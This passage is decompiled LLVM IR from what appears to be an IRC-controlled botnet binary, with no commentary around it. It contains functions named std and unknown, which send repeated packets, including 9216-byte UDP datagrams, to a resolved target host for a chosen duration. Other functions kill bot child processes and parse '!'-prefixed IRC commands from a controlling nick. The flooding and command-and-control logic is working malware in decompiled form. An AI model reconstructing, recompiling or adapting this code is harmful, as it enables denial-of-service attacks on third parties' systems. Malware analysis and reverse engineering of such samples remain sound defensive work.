  %v4_10000d24 = call i32 @__libc_recv(i32 %v4_10000bd8, i32 %v2_10000d10, i32 1024, i32 0)
  %tmp27 = icmp slt i32 %v4_10000d24, 1
  br i1 %tmp27, label %dec_label_pc_10000d48, label %dec_label_pc_10000d3c

dec_label_pc_10000d3c:                            ; preds = %dec_label_pc_10000d10
  %tmp28 = icmp slt i32 %v4_10000d24, 20
  br i1 %tmp28, label %dec_label_pc_10000d50, label %dec_label_pc_10000d48

dec_label_pc_10000d48:                            ; preds = %dec_label_pc_10000d3c, %dec_label_pc_10000d10
  %v0_10000d4c = call i32 @__GI_exit()
  br label %dec_label_pc_10000d50

dec_label_pc_10000d50:                            ; preds = %dec_label_pc_10000d3c, %dec_label_pc_10000d48
  %v2_10000d58 = add i32 %v2_10000c50, 60
  %v3_10000d60 = add i32 %v2_10000d58, %v4_10000d24
  %v4_10000d60 = inttoptr i32 %v3_10000d60 to i8*
  store i8 0, i8* %v4_10000d60, align 1
  %v1_10000d68 = add i32 %v2_10000c50, -1
  %v2_10000d70 = add i32 %v1_10000d68, %v4_10000d24
  %v1_10000d74 = add i32 %v2_10000d70, 60
  %v2_10000d74 = inttoptr i32 %v1_10000d74 to i8*
  %v3_10000d74 = load i8, i8* %v2_10000d74, align 1
  %v3_10000d7c = icmp eq i8 %v3_10000d74, 10
  br i1 %v3_10000d7c, label %dec_label_pc_10000da4, label %dec_label_pc_10000d84

dec_label_pc_10000d84:                            ; preds = %dec_label_pc_10000d50
  %v3_10000d94 = load i8, i8* %v2_10000d74, align 1
  %v3_10000d9c = icmp eq i8 %v3_10000d94, 13
  br i1 %v3_10000d9c, label %dec_label_pc_10000da4, label %dec_label_pc_10000dbc

dec_label_pc_10000da4:                            ; preds = %dec_label_pc_10000d84, %dec_label_pc_10000d50
  store i8 0, i8* %v2_10000d74, align 1
  br label %dec_label_pc_10000dbc

dec_label_pc_10000dbc:                            ; preds = %dec_label_pc_10000d84, %dec_label_pc_10000da4
  %v1_10000dc0 = add i32 %v2_10000c50, -2
  %v2_10000dc8 = add i32 %v1_10000dc0, %v4_10000d24
  %v1_10000dcc = add i32 %v2_10000dc8, 60
  %v2_10000dcc = inttoptr i32 %v1_10000dcc to i8*
  %v3_10000dcc = load i8, i8* %v2_10000dcc, align 1
  %v3_10000dd4 = icmp eq i8 %v3_10000dcc, 10
  br i1 %v3_10000dd4, label %dec_label_pc_10000dfc, label %dec_label_pc_10000ddc

dec_label_pc_10000ddc:                            ; preds = %dec_label_pc_10000dbc
  %v3_10000dec = load i8, i8* %v2_10000dcc, align 1
  %v3_10000df4 = icmp eq i8 %v3_10000dec, 13
  br i1 %v3_10000df4, label %dec_label_pc_10000dfc, label %dec_label_pc_10000e14

dec_label_pc_10000dfc:                            ; preds = %dec_label_pc_10000ddc, %dec_label_pc_10000dbc
  store i8 0, i8* %v2_10000dcc, align 1
  br label %dec_label_pc_10000e14

dec_label_pc_10000e14:                            ; preds = %dec_label_pc_10000ddc, %dec_label_pc_10000dfc
  %v3_10000e18 = load i32, i32* @global_var_1001d83c.269, align 4
  %v6_10000e38 = call i32 @Send(i32 %v4_10000bd8, i32 ptrtoint ([25 x i8]* @global_var_1000b810.270 to i32), i32 %v2_10000d10, i32 %v3_10000e18, i32 268500992)
  store i32 268439108, i32* @lr, align 4
  %v1_10000e40 = call i32 @__libc_close(i32 %v4_10000bd8)
  store i32 ptrtoint ([3 x i8]* @global_var_10000e4c.271 to i32), i32* @lr, align 4
  %v1_10000e48 = call i32 @__libc_close(i32 %v3_10000b18)
  %v0_10000e50 = call i32 @__GI_exit()
  br label %dec_label_pc_10000e54

dec_label_pc_10000e54:                            ; preds = %dec_label_pc_10000bac, %dec_label_pc_10000b90, %dec_label_pc_10000b34, %entry, %dec_label_pc_10000e14
  %v0_10000e68 = phi i32 [ 0, %dec_label_pc_10000bac ], [ -1, %dec_label_pc_10000b90 ], [ -1, %dec_label_pc_10000b34 ], [ -1, %entry ], [ %v0_10000e50, %dec_label_pc_10000e14 ]
  ret i32 %v0_10000e68

; uselistorder directives
  uselistorder i8* %v2_10000dcc, { 1, 0, 2 }
  uselistorder i8* %v2_10000d74, { 1, 0, 2 }
  uselistorder i32 %v4_10000d24, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_10000cec, { 0, 2, 1 }
  uselistorder i32 %v1_10000c2c, { 1, 0 }
  uselistorder i32 %v1_10000c64, { 1, 0 }
  uselistorder i32* %v1_10000c5c, { 1, 0, 2 }
  uselistorder i32 %v2_10000bfc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10000bd8, { 2, 3, 4, 5, 6, 1, 0, 7 }
  uselistorder i32* %stack_var_-1212, { 1, 0 }
  uselistorder i32* %stack_var_-1216, { 1, 0 }
  uselistorder i32 60, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10000e54, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10000e14, { 1, 0 }
  uselistorder label %dec_label_pc_10000dbc, { 1, 0 }
  uselistorder label %dec_label_pc_10000d50, { 1, 0 }
  uselistorder label %dec_label_pc_10000cd4, { 1, 0 }
  uselistorder label %dec_label_pc_10000bfc, { 1, 0 }
}

define i32 @std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_10000e94 = icmp sgt i32 %arg3, 2
  br i1 %v2_10000e94, label %dec_label_pc_10000ea4, label %dec_label_pc_10000e9c

dec_label_pc_10000e9c:                            ; preds = %entry
  %v0_10000ea0 = call i32 @__GI_exit()
  br label %dec_label_pc_10000ea4

dec_label_pc_10000ea4:                            ; preds = %entry, %dec_label_pc_10000e9c
  store i32 268439220, i32* @lr, align 4
  %v3_10000eb0 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268439236, i32* @lr, align 4
  %v1_10000ec0 = call i32 @__GI_time(i32 0)
  %v1_10000ed0 = add i32 %arg4, 12
  %v1_10000ed4 = inttoptr i32 %v1_10000ed0 to i32*
  %v2_10000ed4 = load i32, i32* %v1_10000ed4, align 4
  store i32 268439264, i32* @lr, align 4
  %v2_10000edc = call i32 @atol(i32 %v2_10000ed4, i32 %v1_10000ed0)
  %v1_10000eec = call i32 @mfork(i32 %arg2)
  %v3_10000ef4 = icmp eq i32 %v1_10000eec, 0
  br i1 %v3_10000ef4, label %dec_label_pc_10000efc, label %dec_label_pc_10001024

dec_label_pc_10000efc:                            ; preds = %dec_label_pc_10000ea4
  %v1_10000f00 = add i32 %arg4, 4
  %v1_10000f04 = inttoptr i32 %v1_10000f00 to i32*
  %v2_10000f04 = load i32, i32* %v1_10000f04, align 4
  store i32 268439312, i32* @lr, align 4
  %v2_10000f0c = call i32 @__GI_gethostbyname(i32 %v2_10000f04, i32 %v1_10000f00)
  %v2_10000f18 = ptrtoint i32* %stack_var_-52 to i32
  store i32 0, i32* %stack_var_-52, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v1_10000f40 = add i32 %v2_10000f0c, 16
  %v2_10000f40 = inttoptr i32 %v1_10000f40 to i32*
  %v3_10000f40 = load i32, i32* %v2_10000f40, align 4
  %v1_10000f44 = inttoptr i32 %v3_10000f40 to i32*
  %v2_10000f44 = load i32, i32* %v1_10000f44, align 4
  %v2_10000f4c = ptrtoint i32* %stack_var_-48 to i32
  %v1_10000f54 = add i32 %v2_10000f0c, 12
  %v2_10000f54 = inttoptr i32 %v1_10000f54 to i32*
  %v3_10000f54 = load i32, i32* %v2_10000f54, align 4
  store i32 %v3_10000f54, i32* @r5, align 4
  store i32 268439400, i32* @lr, align 4
  %v4_10000f64 = call i32 @bcopy(i32 %v2_10000f44, i32 %v2_10000f4c, i32 %v3_10000f54, i32 %v2_10000f0c)
  %v1_10000f6c = add i32 %v2_10000f0c, 8
  %v2_10000f6c = inttoptr i32 %v1_10000f6c to i32*
  %v3_10000f6c = load i32, i32* %v2_10000f6c, align 4
  %v1_10000f70 = urem i32 %v3_10000f6c, 65536
  store i32 %v1_10000f70, i32* %stack_var_-52, align 4
  %v1_10000f7c = add i32 %arg4, 8
  %v1_10000f80 = inttoptr i32 %v1_10000f7c to i32*
  %v2_10000f80 = load i32, i32* %v1_10000f80, align 4
  store i32 268439436, i32* @lr, align 4
  %v2_10000f88 = call i32 @atol(i32 %v2_10000f80, i32 %v1_10000f7c)
  %v2_10000ff0 = add i32 %v2_10000edc, %v1_10000ec0
  br label %dec_label_pc_10000fa0

dec_label_pc_10000fa0:                            ; preds = %dec_label_pc_10001014, %dec_label_pc_10000efc
  %storemerge1 = phi i32 [ 0, %dec_label_pc_10000efc ], [ %v1_10001018, %dec_label_pc_10001014 ]
  %tmp19 = icmp ult i32 %storemerge1, 50
  br i1 %tmp19, label %dec_label_pc_10001014, label %dec_label_pc_10000fac

dec_label_pc_10000fac:                            ; preds = %dec_label_pc_10000fa0
  store i32 268439492, i32* @lr, align 4
  %v5_10000fc0 = call i32 @__libc_send(i32 %v3_10000eb0, i32 ptrtoint ([4 x i8]* @global_var_1000b82c.273 to i32), i32 50, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_10000fd8.274 to i32), i32* @lr, align 4
  %v3_10000fd4 = call i32 @__libc_connect(i32 %v3_10000eb0, i32 %v2_10000f18, i32 16)
  store i32 268439520, i32* @lr, align 4
  %v1_10000fdc = call i32 @__GI_time(i32 0)
  %v2_10000ff4 = icmp ult i32 %v1_10000fdc, %v2_10000ff0
  br i1 %v2_10000ff4, label %dec_label_pc_1000100c, label %dec_label_pc_10000ffc

dec_label_pc_10000ffc:                            ; preds = %dec_label_pc_10000fac
  store i32 ptrtoint ([3 x i8]* @global_var_10001004.275 to i32), i32* @lr, align 4
  %v1_10001000 = call i32 @__libc_close(i32 %v3_10000eb0)
  %v0_10001008 = call i32 @__GI_exit()
  br label %dec_label_pc_1000100c

dec_label_pc_1000100c:                            ; preds = %dec_label_pc_10000fac, %dec_label_pc_10000ffc
  br label %dec_label_pc_10001014

dec_label_pc_10001014:                            ; preds = %dec_label_pc_10000fa0, %dec_label_pc_1000100c
  %stack_var_-72.0 = phi i32 [ %storemerge1, %dec_label_pc_10000fa0 ], [ 0, %dec_label_pc_1000100c ]
  %v1_10001018 = add i32 %stack_var_-72.0, 1
  br label %dec_label_pc_10000fa0

dec_label_pc_10001024:                            ; preds = %dec_label_pc_10000ea4
  ret i32 %v1_10000eec

; uselistorder directives
  uselistorder i32 %v3_10000f54, { 1, 0 }
  uselistorder i32 %v2_10000f0c, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder label %dec_label_pc_10001014, { 1, 0 }
  uselistorder label %dec_label_pc_1000100c, { 1, 0 }
  uselistorder label %dec_label_pc_10000ea4, { 1, 0 }
}

define i32 @stop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10001054 = load i32, i32* %r3.global-to-local, align 4
  %v3_100011442 = load i32, i32* @global_var_1001d834.265, align 4
  %v2_1000114c3 = icmp eq i32 %v3_100011442, 0
  br i1 %v2_1000114c3, label %dec_label_pc_10001154, label %dec_label_pc_10001070.lr.ph

dec_label_pc_10001070.lr.ph:                      ; preds = %entry
  %v3_100010c4 = icmp eq i32 %arg2, 0
  br label %dec_label_pc_10001070

dec_label_pc_10001070:                            ; preds = %dec_label_pc_10001070.lr.ph, %dec_label_pc_10001134
  %v0_1000116c9 = phi i32 [ %v0_10001054, %dec_label_pc_10001070.lr.ph ], [ %v0_1000116c8, %dec_label_pc_10001134 ]
  %storemerge15 = phi i32 [ 0, %dec_label_pc_10001070.lr.ph ], [ %v1_10001138, %dec_label_pc_10001134 ]
  %v1_10001074 = mul i32 %storemerge15, 4
  %v3_10001080 = load i32, i32* @global_var_1001d860.266, align 4
  %v2_10001084 = add i32 %v3_10001080, %v1_10001074
  %v1_10001088 = inttoptr i32 %v2_10001084 to i32*
  %v2_10001088 = load i32, i32* %v1_10001088, align 4
  %v3_1000108c = icmp eq i32 %v2_10001088, 0
  br i1 %v3_1000108c, label %dec_label_pc_10001134, label %dec_label_pc_10001094

dec_label_pc_10001094:                            ; preds = %dec_label_pc_10001070
  %v2_100010ac = load i32, i32* %v1_10001088, align 4
  store i32 268439732, i32* @lr, align 4
  %v0_100010b0 = call i32 @__libc_getpid()
  store i32 %v0_100010b0, i32* %r3.global-to-local, align 4
  %v4_100010b8 = icmp eq i32 %v2_100010ac, %v0_100010b0
  br i1 %v4_100010b8, label %dec_label_pc_10001134, label %dec_label_pc_100010c0

dec_label_pc_100010c0:                            ; preds = %dec_label_pc_10001094
  br i1 %v3_100010c4, label %dec_label_pc_1000110c, label %dec_label_pc_100010cc

dec_label_pc_100010cc:                            ; preds = %dec_label_pc_100010c0
  %v3_100010d0 = load i32, i32* @global_var_1001d85c.277, align 4
  %v3_100010e4 = load i32, i32* @global_var_1001d860.266, align 4
  %v2_100010e8 = add i32 %v3_100010e4, %v1_10001074
  %v1_100010ec = inttoptr i32 %v2_100010e8 to i32*
  %v2_100010ec = load i32, i32* %v1_100010ec, align 4
  store i32 %v0_10001054, i32* %r3.global-to-local, align 4
  %v6_10001108 = call i32 @Send(i32 %v0_10001054, i32 ptrtoint ([29 x i8]* @global_var_1000b830.278 to i32), i32 %v3_100010d0, i32 %v2_100010ec, i32 268500992)
  store i32 %v6_10001108, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000110c

dec_label_pc_1000110c:                            ; preds = %dec_label_pc_100010c0, %dec_label_pc_100010cc
  %v3_1000111c = load i32, i32* @global_var_1001d860.266, align 4
  %v2_10001120 = add i32 %v3_1000111c, %v1_10001074
  %v1_10001124 = inttoptr i32 %v2_10001120 to i32*
  %v2_10001124 = load i32, i32* %v1_10001124, align 4
  store i32 %v2_10001124, i32* %r3.global-to-local, align 4
  store i32 268439860, i32* @lr, align 4
  %v2_10001130 = call i32 @kill(i32 %v2_10001124, i32 9)
  store i32 %v2_10001130, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001134

dec_label_pc_10001134:                            ; preds = %dec_label_pc_10001094, %dec_label_pc_10001070, %dec_label_pc_1000110c
  %v0_1000116c8 = phi i32 [ %v0_100010b0, %dec_label_pc_10001094 ], [ %v0_1000116c9, %dec_label_pc_10001070 ], [ %v2_10001130, %dec_label_pc_1000110c ]
  %v1_10001138 = add i32 %storemerge15, 1
  %v3_10001144 = load i32, i32* @global_var_1001d834.265, align 4
  %v2_1000114c = icmp ult i32 %v1_10001138, %v3_10001144
  br i1 %v2_1000114c, label %dec_label_pc_10001070, label %dec_label_pc_10001140.dec_label_pc_10001154_crit_edge

dec_label_pc_10001140.dec_label_pc_10001154_crit_edge: ; preds = %dec_label_pc_10001134
  br label %dec_label_pc_10001154

dec_label_pc_10001154:                            ; preds = %entry, %dec_label_pc_10001140.dec_label_pc_10001154_crit_edge
  %v0_1000116c = phi i32 [ %v0_1000116c8, %dec_label_pc_10001140.dec_label_pc_10001154_crit_edge ], [ %v0_10001054, %entry ]
  ret i32 %v0_1000116c

; uselistorder directives
  uselistorder i32 %v1_10001074, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %v0_10001054, { 0, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 4, 2, 5, 3, 6, 0, 1 }
  uselistorder label %dec_label_pc_10001154, { 1, 0 }
  uselistorder label %dec_label_pc_10001134, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000110c, { 1, 0 }
  uselistorder label %dec_label_pc_10001070, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  store i32 1, i32* %stack_var_-48, align 4
  store i32 9216, i32* @r3, align 4
  store i32 268439972, i32* @lr, align 4
  %v0_100011a0 = call i32 @malloc()
  store i32 268439988, i32* @lr, align 4
  %v1_100011b0 = call i32 @__GI_time(i32 0)
  %v1_100011c0 = call i32 @mfork(i32 %arg2)
  %v3_100011c8 = icmp eq i32 %v1_100011c0, 0
  br i1 %v3_100011c8, label %dec_label_pc_100011d0, label %dec_label_pc_10001354

dec_label_pc_100011d0:                            ; preds = %entry
  %v3_100011d4 = icmp eq i32 %arg3, 2
  br i1 %v3_100011d4, label %dec_label_pc_100011e4, label %dec_label_pc_100011dc

dec_label_pc_100011dc:                            ; preds = %dec_label_pc_100011d0
  %v0_100011e0 = call i32 @__GI_exit()
  br label %dec_label_pc_100011e4

dec_label_pc_100011e4:                            ; preds = %dec_label_pc_100011d0, %dec_label_pc_100011dc
  %v1_100011e8 = add i32 %arg4, 8
  %v1_100011ec = inttoptr i32 %v1_100011e8 to i32*
  %v2_100011ec = load i32, i32* %v1_100011ec, align 4
  store i32 268440056, i32* @lr, align 4
  %v2_100011f4 = call i32 @atol(i32 %v2_100011ec, i32 %v1_100011e8)
  %v2_10001200 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  %v1_10001228 = add i32 %arg4, 4
  %v1_1000122c = inttoptr i32 %v1_10001228 to i32*
  %v2_1000122c = load i32, i32* %v1_1000122c, align 4
  store i32 268440124, i32* @lr, align 4
  %v3_10001238 = call i32 @host2ip(i32 %arg2, i32 %v2_1000122c, i32 %v1_10001228)
  store i32 2, i32* %stack_var_-44, align 4
  %v3_10001250 = load i32, i32* @global_var_1001d85c.277, align 4
  %v2_1000125c = load i32, i32* %v1_1000122c, align 4
  %v6_10001278 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1000b850.279 to i32), i32 %v3_10001250, i32 %v2_1000125c, i32 268500992)
  %v2_10001320 = add i32 %v2_100011f4, %v1_100011b0
  %v2_100012b8 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_1000127c

dec_label_pc_1000127c:                            ; preds = %dec_label_pc_10001334, %dec_label_pc_100011e4
  %stack_var_-56.0 = phi i32 [ %tmp, %dec_label_pc_100011e4 ], [ %v1_10001338, %dec_label_pc_10001334 ]
  store i32 268440192, i32* @lr, align 4
  %v0_1000127c = call i32 @random()
  store i32 268440220, i32* @lr, align 4
  %v3_10001298 = call i32 @socket(i32 2, i32 2, i32 17)
  %v1_100012a8 = icmp slt i32 %v3_10001298, 0
  br i1 %v1_100012a8, label %dec_label_pc_100012fc, label %dec_label_pc_100012b0

dec_label_pc_100012b0:                            ; preds = %dec_label_pc_1000127c
  store i32 1, i32* %stack_var_-48, align 4
  store i32 268440276, i32* @lr, align 4
  %v3_100012d0 = call i32 @ioctl(i32 %v3_10001298, i32 -2147195266, i32 %v2_100012b8)
  store i32 268440308, i32* @lr, align 4
  %v6_100012f0 = call i32 @__libc_sendto(i32 %v3_10001298, i32 %v0_100011a0, i32 9216, i32 0, i32 %v2_10001200, i32 16)
  store i32 268440316, i32* @lr, align 4
  %v1_100012f8 = call i32 @__libc_close(i32 %v3_10001298)
  br label %dec_label_pc_100012fc

dec_label_pc_100012fc:                            ; preds = %dec_label_pc_1000127c, %dec_label_pc_100012b0
  %tmp20 = icmp slt i32 %stack_var_-56.0, 50
  br i1 %tmp20, label %dec_label_pc_10001334, label %dec_label_pc_10001308

dec_label_pc_10001308:                            ; preds = %dec_label_pc_100012fc
  store i32 268440336, i32* @lr, align 4
  %v1_1000130c = call i32 @__GI_time(i32 0)
  %v2_10001324 = icmp ult i32 %v1_1000130c, %v2_10001320
  br i1 %v2_10001324, label %dec_label_pc_1000132c, label %dec_label_pc_10001344

dec_label_pc_1000132c:                            ; preds = %dec_label_pc_10001308
  br label %dec_label_pc_10001334

dec_label_pc_10001334:                            ; preds = %dec_label_pc_100012fc, %dec_label_pc_1000132c
  %stack_var_-56.1 = phi i32 [ %stack_var_-56.0, %dec_label_pc_100012fc ], [ 0, %dec_label_pc_1000132c ]
  %v1_10001338 = add i32 %stack_var_-56.1, 1
  br label %dec_label_pc_1000127c

dec_label_pc_10001344:                            ; preds = %dec_label_pc_10001308
  store i32 ptrtoint ([3 x i8]* @global_var_1000134c.281 to i32), i32* @lr, align 4
  %v1_10001348 = call i32 @__libc_close(i32 %v3_10001298)
  %v0_10001350 = call i32 @__GI_exit()
  br label %dec_label_pc_10001354

dec_label_pc_10001354:                            ; preds = %entry, %dec_label_pc_10001344
  %v0_10001368 = phi i32 [ %v1_100011c0, %entry ], [ %v0_10001350, %dec_label_pc_10001344 ]
  ret i32 %v0_10001368

; uselistorder directives
  uselistorder i32* %stack_var_-48, { 0, 2, 1 }
  uselistorder i32 50, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @atol, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10001354, { 1, 0 }
  uselistorder label %dec_label_pc_10001334, { 1, 0 }
  uselistorder label %dec_label_pc_100012fc, { 1, 0 }
  uselistorder label %dec_label_pc_100011e4, { 1, 0 }
}

define i32 @killsec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10001394 = load i32, i32* bitcast ([9 x i8*]* @global_var_1001d7e4.287 to i32*), align 16
  store i32 %v3_10001394, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  %v3_100013a0 = call i32 @__GI_strcasecmp(i32 %v3_10001394, i32 %arg2)
  %v3_100013a8 = icmp eq i32 %v3_100013a0, 0
  br i1 %v3_100013a8, label %dec_label_pc_100013b0, label %dec_label_pc_100013bc

dec_label_pc_100013b0:                            ; preds = %entry
  store i32 268440508, i32* @lr, align 4
  %v2_100013b8 = call i32 @kill(i32 0, i32 9)
  br label %dec_label_pc_100013bc

dec_label_pc_100013bc:                            ; preds = %entry, %dec_label_pc_100013b0
  %v0_100013d0 = phi i32 [ %v3_100013a0, %entry ], [ %v2_100013b8, %dec_label_pc_100013b0 ]
  ret i32 %v0_100013d0

; uselistorder directives
  uselistorder label %dec_label_pc_100013bc, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-1144 = alloca i32, align 4
  %stack_var_-1076 = alloca i32, align 4
  %stack_var_-1152 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100013d4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100013d4, i32* %stack_var_-1152, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* @r3, align 4
  %v0_1000141870 = call i32 @__GI_strlen()
  store i32 %v0_1000141870, i32* %r3.global-to-local, align 4
  %v0_1000142071 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000142072 = icmp ult i32 %v0_1000142071, %v0_1000141870
  br i1 %v2_1000142072, label %dec_label_pc_10001428, label %dec_label_pc_10001448

dec_label_pc_10001404:                            ; preds = %dec_label_pc_10001428
  %v1_10001408 = add i32 %storemerge875, 1
  store i32 %v1_10001408, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* @r3, align 4
  %v0_10001418 = call i32 @__GI_strlen()
  store i32 %v0_10001418, i32* %r3.global-to-local, align 4
  %v0_10001420 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001420 = icmp ult i32 %v0_10001420, %v0_10001418
  br i1 %v2_10001420, label %dec_label_pc_10001428, label %dec_label_pc_10001448

dec_label_pc_10001428:                            ; preds = %entry, %dec_label_pc_10001404
  %storemerge875 = phi i32 [ %v1_10001408, %dec_label_pc_10001404 ], [ 0, %entry ]
  %v2_10001434 = add i32 %storemerge875, %arg3
  %v1_10001438 = inttoptr i32 %v2_10001434 to i8*
  %v2_10001438 = load i8, i8* %v1_10001438, align 1
  %v3_10001440 = icmp eq i8 %v2_10001438, 32
  br i1 %v3_10001440, label %dec_label_pc_10001448, label %dec_label_pc_10001404

dec_label_pc_10001448:                            ; preds = %dec_label_pc_10001404, %dec_label_pc_10001428, %entry
  %storemerge8.lcssa = phi i32 [ 0, %entry ], [ %v1_10001408, %dec_label_pc_10001404 ], [ %storemerge875, %dec_label_pc_10001428 ]
  %v2_10001454 = add i32 %storemerge8.lcssa, %arg3
  %v3_1000145c = inttoptr i32 %v2_10001454 to i8*
  store i8 0, i8* %v3_1000145c, align 1
  %v1_10001478 = add i32 %v2_10001454, 2
  %v5_1000147c = inttoptr i32 %v1_10001478 to i8*
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r3, align 4
  %v0_100014a062 = call i32 @__GI_strlen()
  store i32 %v0_100014a062, i32* %r3.global-to-local, align 4
  %v0_100014a863 = load i32, i32* %r29.global-to-local, align 4
  %v2_100014a864 = icmp ult i32 %v0_100014a863, %v0_100014a062
  br i1 %v2_100014a864, label %dec_label_pc_100014b0, label %dec_label_pc_100014d0

dec_label_pc_1000148c:                            ; preds = %dec_label_pc_100014b0
  %v1_10001490 = add i32 %storemerge967, 1
  store i32 %v1_10001490, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r3, align 4
  %v0_100014a0 = call i32 @__GI_strlen()
  store i32 %v0_100014a0, i32* %r3.global-to-local, align 4
  %v0_100014a8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100014a8 = icmp ult i32 %v0_100014a8, %v0_100014a0
  br i1 %v2_100014a8, label %dec_label_pc_100014b0, label %dec_label_pc_100014d0

dec_label_pc_100014b0:                            ; preds = %dec_label_pc_10001448, %dec_label_pc_1000148c
  %storemerge967 = phi i32 [ %v1_10001490, %dec_label_pc_1000148c ], [ 0, %dec_label_pc_10001448 ]
  %v2_100014bc = add i32 %storemerge967, %arg2
  %v1_100014c0 = inttoptr i32 %v2_100014bc to i8*
  %v2_100014c0 = load i8, i8* %v1_100014c0, align 1
  %v3_100014c8 = icmp eq i8 %v2_100014c0, 33
  br i1 %v3_100014c8, label %dec_label_pc_100014d0, label %dec_label_pc_1000148c

dec_label_pc_100014d0:                            ; preds = %dec_label_pc_1000148c, %dec_label_pc_100014b0, %dec_label_pc_10001448
  %storemerge9.lcssa = phi i32 [ 0, %dec_label_pc_10001448 ], [ %v1_10001490, %dec_label_pc_1000148c ], [ %storemerge967, %dec_label_pc_100014b0 ]
  %v2_100014dc = add i32 %storemerge9.lcssa, %arg2
  %v3_100014e4 = inttoptr i32 %v2_100014dc to i8*
  store i8 0, i8* %v3_100014e4, align 1
  %v2_100014ec = load i8, i8* %v5_1000147c, align 1
  %v3_100014f4 = icmp eq i8 %v2_100014ec, 33
  br i1 %v3_100014f4, label %dec_label_pc_100014fc, label %dec_label_pc_10001940

dec_label_pc_100014fc:                            ; preds = %dec_label_pc_100014d0
  %v3_10001500 = load i32, i32* @global_var_1001d85c.277, align 4
  store i32 %arg3, i32* @r3, align 4
  store i32 %v3_10001500, i32* @r4, align 4
  %v2_1000150c = call i32 @__GI_strcasecmp(i32 %arg3, i32 %v3_10001500)
  store i32 %v2_1000150c, i32* %r3.global-to-local, align 4
  %v3_10001514 = icmp eq i32 %v2_1000150c, 0
  br i1 %v3_10001514, label %dec_label_pc_1000151c, label %dec_label_pc_10001940

dec_label_pc_1000151c:                            ; preds = %dec_label_pc_100014fc
  %v2_1000151c = ptrtoint i32* %stack_var_-1076 to i32
  store i32 %v2_1000151c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10001534.288 to i32), i32* @lr, align 4
  %v3_10001530 = call i32 @__GI_memset(i32 %v2_1000151c, i32 0, i32 1024)
  %v1_10001540 = add i32 %v2_10001454, 3
  %v5_10001544 = inttoptr i32 %v1_10001540 to i8*
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10001540, i32* @r3, align 4
  %v0_1000156854 = call i32 @__GI_strlen()
  store i32 %v0_1000156854, i32* %r3.global-to-local, align 4
  %v0_1000157055 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000157056 = icmp ult i32 %v0_1000157055, %v0_1000156854
  br i1 %v2_1000157056, label %dec_label_pc_10001578, label %dec_label_pc_10001598

dec_label_pc_10001554:                            ; preds = %dec_label_pc_10001578
  %v1_10001558 = add i32 %storemerge1059, 1
  store i32 %v1_10001558, i32* %r29.global-to-local, align 4
  store i32 %v1_10001540, i32* @r3, align 4
  %v0_10001568 = call i32 @__GI_strlen()
  store i32 %v0_10001568, i32* %r3.global-to-local, align 4
  %v0_10001570 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001570 = icmp ult i32 %v0_10001570, %v0_10001568
  br i1 %v2_10001570, label %dec_label_pc_10001578, label %dec_label_pc_10001598

dec_label_pc_10001578:                            ; preds = %dec_label_pc_1000151c, %dec_label_pc_10001554
  %storemerge1059 = phi i32 [ %v1_10001558, %dec_label_pc_10001554 ], [ 0, %dec_label_pc_1000151c ]
  %v2_10001584 = add i32 %storemerge1059, %v1_10001540
  %v1_10001588 = inttoptr i32 %v2_10001584 to i8*
  %v2_10001588 = load i8, i8* %v1_10001588, align 1
  %v3_10001590 = icmp eq i8 %v2_10001588, 32
  br i1 %v3_10001590, label %dec_label_pc_10001598, label %dec_label_pc_10001554

dec_label_pc_10001598:                            ; preds = %dec_label_pc_10001554, %dec_label_pc_10001578, %dec_label_pc_1000151c
  %storemerge10.lcssa = phi i32 [ 0, %dec_label_pc_1000151c ], [ %v1_10001558, %dec_label_pc_10001554 ], [ %storemerge1059, %dec_label_pc_10001578 ]
  %v2_100015a4 = add i32 %storemerge10.lcssa, %v1_10001540
